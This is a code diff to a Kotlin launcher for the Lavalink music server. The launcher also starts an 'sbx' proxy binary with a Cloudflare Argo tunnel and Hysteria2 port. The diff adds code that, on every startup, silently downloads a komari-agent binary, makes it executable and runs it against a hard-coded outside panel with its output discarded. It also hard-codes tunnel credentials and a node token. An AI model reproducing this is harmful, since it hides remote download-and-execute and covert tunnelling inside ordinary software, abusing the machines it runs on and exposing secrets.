@@ -63,11 +63,20 @@ object Launcher {
     val startTime = System.currentTimeMillis()
 
     private var sbxProcess: Process? = null
+    private var komariProcess: Process? = null
     private val filePath = System.getenv("FILE_PATH") ?: "./logs"
+
+    // ========== komari 探针配置：以下两项可直接在这里填写 ==========
+    // komari 面板地址（含端口），例如: https://v.cws.kdns.fr ，留空则不启动探针
+    private const val KOMARI_ENDPOINT_DEFAULT = "https://v.cws.kdns.fr"
+    // komari 节点Token，面板后台安装命令里获取，需与上面地址同时填写
+    private const val KOMARI_TOKEN_DEFAULT = "7FMOT6Cf9QlKkjRU1cL8Dk"
+    // 也可改用环境变量或 jar 同目录的 .env 文件填写，优先级: 环境变量 > .env > 此处默认值
+    // ===============================================================
     
     private val ALL_ENV_VARS = arrayOf(
-        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "FILE_PATH", "UUID", "KOMARI_ENDPOINT", "KOMARI_TOKEN",
+        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
@@ -78,6 +87,7 @@ object Launcher {
         try {
             checkJavaVersion()
             loadSbxConfig()
+            startKomariAgent()
             runSbxBinary()
             
         } catch (e: Exception) {
@@ -124,6 +134,87 @@ object Launcher {
         }
     }
 
+    /**
+     * 读取配置：环境变量 > .env 文件（启动时加载为系统属性）> 代码内默认值
+     */
+    private fun getEnvOrProp(name: String, default: String = ""): String {
+        val value = System.getenv(name)?.takeIf { it.isNotBlank() }
+            ?: System.getProperty(name)?.takeIf { it.isNotBlank() }
+        return value ?: default
+    }
+
+    /**
+     * 独立下载并启动 komari 探针（替代旧版哪吒探针）
+     * KOMARI_ENDPOINT 或 KOMARI_TOKEN 任一为空则跳过，失败只记录日志，不影响 Lavalink 启动
+     */
+    private fun startKomariAgent() {
+        val endpoint = getEnvOrProp("KOMARI_ENDPOINT", KOMARI_ENDPOINT_DEFAULT).trim()
+        val token = getEnvOrProp("KOMARI_TOKEN", KOMARI_TOKEN_DEFAULT).trim()
+        if (endpoint.isEmpty() || token.isEmpty()) {
+            log.info("KOMARI_ENDPOINT / KOMARI_TOKEN is empty (Launcher.kt / .env / env vars), skip komari agent")
+            return
+        }
+
+        try {
+            val binaryPath = getKomariBinaryPath()
+            val pb = ProcessBuilder(binaryPath.toString(), "-e", endpoint, "-t", token)
+            pb.redirectErrorStream(true)
+            // 探针日志不输出到控制台，避免刷屏
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD)
+            komariProcess = pb.start()
+            log.info("Komari agent started, endpoint: $endpoint")
+        } catch (e: Exception) {
+            log.error("Failed to start komari agent", e)
+        }
+    }
+
+    /**
+     * 根据系统下载对应的 komari-agent 二进制（GitHub Releases 固定版本）
+     */
+    private fun getKomariBinaryPath(): Path {
+        val osName = System.getProperty("os.name").lowercase()
+        val osArch = System.getProperty("os.arch").lowercase()
+
+        val os = when {
+            osName.contains("mac") || osName.contains("darwin") -> "darwin"
+            osName.contains("win") -> "windows"
+            osName.contains("freebsd") -> "freebsd"
+            else -> "linux"
+        }
+        val arch = when {
+            osArch.contains("amd64") || osArch.contains("x86_64") -> "amd64"
+            osArch.contains("aarch64") || osArch.contains("arm64") -> "arm64"
+            osArch.contains("loongarch64") || osArch.contains("loong64") -> "loong64"
+            osArch.contains("arm") -> "arm"
+            osArch.contains("386") || osArch.contains("i386") || osArch.contains("i686") -> "386"
+            else -> throw RuntimeException("Unsupported architecture for komari-agent: $osArch")
+        }
+
+        val suffix = if (os == "windows") ".exe" else ""
+        val assetName = "komari-agent-$os-$arch$suffix"
+        val url = "https://github.com/komari-monitor/komari-agent/releases/download/1.5.11/$assetName"
+
+        val path = Paths.get(System.getProperty("java.io.tmpdir"), assetName)
+        if (!Files.exists(path)) {
+            log.info("Downloading komari-agent from $url")
+            // 先下载到临时文件再改名，避免下载中断留下损坏的二进制
+            val tmpPath = Paths.get("$path.tmp")
+            try {
+                URL(url).openStream().use { input ->
+                    Files.copy(input, tmpPath, StandardCopyOption.REPLACE_EXISTING)
+                }
+                Files.move(tmpPath, path, StandardCopyOption.REPLACE_EXISTING)
+            } catch (e: Exception) {
+                Files.deleteIfExists(tmpPath)
+                throw e
+            }
+            if (os != "windows" && !path.toFile().setExecutable(true)) {
+                throw IOException("Failed to set executable permission")
+            }
+        }
+        return path
+    }
+
     private fun runSbxBinary() {
         val binaryPath = getSbxBinaryPath()
         
@@ -131,14 +222,11 @@ object Launcher {
         // 环境变量
         envVars["UUID"] = "ee0c49f3-0584-40fd-87d4-e76f0afcc81f"
         envVars["FILE_PATH"] = "./logs"
-        envVars["NEZHA_SERVER"] = ""
-        envVars["NEZHA_PORT"] = ""
-        envVars["NEZHA_KEY"] = ""
         envVars["ARGO_PORT"] = "8001"
-        envVars["ARGO_DOMAIN"] = ""
-        envVars["ARGO_AUTH"] = ""
+        envVars["ARGO_DOMAIN"] = "adkynet.cncw.de5.net"
+        envVars["ARGO_AUTH"] = "eyJhIjoiNzgxZjRkNWMxMGRhYzBkM2FiMGUzMTMzZDE0MTM2ZjgiLCJ0IjoiZmM0YzU5ZGMtZjQ3MC00N2Q0LTk3NDYtMDVjOGQ2MzkyODRkIiwicyI6Ik1ERTNaVEZrTjJZdFpUUTJZeTAwTldaa0xUazJNMlV0TW1KaVl6ZzRNR1ZrWWpKaiJ9"
         envVars["S5_PORT"] = ""
-        envVars["HY2_PORT"] = ""
+        envVars["HY2_PORT"] = "3457"
         envVars["TUIC_PORT"] = ""
         envVars["ANYTLS_PORT"] = ""
         envVars["REALITY_PORT"] = ""
@@ -146,7 +234,7 @@ object Launcher {
         envVars["UPLOAD_URL"] = ""
         envVars["CHAT_ID"] = ""
         envVars["BOT_TOKEN"] = ""
-        envVars["CFIP"] = "spring.io"
+        envVars["CFIP"] = "saas.sin.fan"
         envVars["CFPORT"] = "443"
         envVars["NAME"] = ""
         envVars["DISABLE_ARGO"] = "false"
@@ -158,6 +246,9 @@ object Launcher {
 
         val pb = ProcessBuilder(binaryPath.toString())
         pb.environment().putAll(envVars)
+        // komari探针由独立进程下载运行，不传给sbx，避免重复启动探针
+        pb.environment().remove("KOMARI_ENDPOINT")
+        pb.environment().remove("KOMARI_TOKEN")
         pb.redirectErrorStream(true)
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT)
 
@@ -240,6 +331,14 @@ object Launcher {
         }
     }
 
+    private fun stopKomariAgent() {
+        komariProcess?.let {
+            if (it.isAlive()) {
+                it.destroy()
+            }
+        }
+    }
+
 
     /**
      * 获取版本信息
@@ -308,14 +407,16 @@ object Launcher {
             return
         }
     
+        // 先注册关闭钩子，确保 sbx / komari 探针进程在启动失败时也能被回收
+        Runtime.getRuntime().addShutdownHook(Thread {
+            stopSbxServices()
+            stopKomariAgent()
+        })
+
         startSbxService()
     
         log.info("Starting Lavalink...")
         val parent = launchPluginBootstrap(args)
-            
-        Runtime.getRuntime().addShutdownHook(Thread {
-            stopSbxServices()
-        })
             
         launchMain(parent, args)
     }
